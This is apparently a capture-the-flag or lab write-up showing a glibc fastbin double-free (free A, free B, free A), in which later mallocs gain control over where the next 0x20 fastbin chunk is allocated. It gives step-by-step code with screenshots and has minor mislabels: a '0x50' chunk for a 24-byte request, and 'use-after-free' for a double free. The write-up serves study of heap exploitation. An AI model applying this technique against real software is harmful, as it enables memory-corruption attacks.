## Fastbin with Use-After-Free
*****************************************
1.- Request two 0x50 size chunk
```
chunk_A = malloc(24, b"A"*24)
chunk_B = malloc(24, b"B"*24)
```
![imagen1.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen1.png)

2.- Free chunk A
```
free(chunk_A)
```
![imagen2.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen2.png)

3.- Free chunk B
```
free(chunk_B)
```
![imagen3.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen3.png)

4.- Free chunk A
```
free(chunk_A)
```
![imagen4.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen4.png)

5.- malloc(24,b'C'*24)
```
malloc(24,b'C'*24)
```
![imagen5.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen5.png)

6.- There are the CCCCCCC… where before was the 7020 pointer :O, so where will do now the Ds malloc?
```
malloc(24,b'D'*24)
```
![imagen6.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen6.png)

7.- Yes, in the next chunk linked in the 0x20 fastbin list...
So now we will send some EEEE's
```
malloc(24,b'E'*24)
```
![imagen7.png](https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/fastbin_dup/assets/imagen7.png)

And now we can note that we controll where the next 0x20 fastbin will be allocated.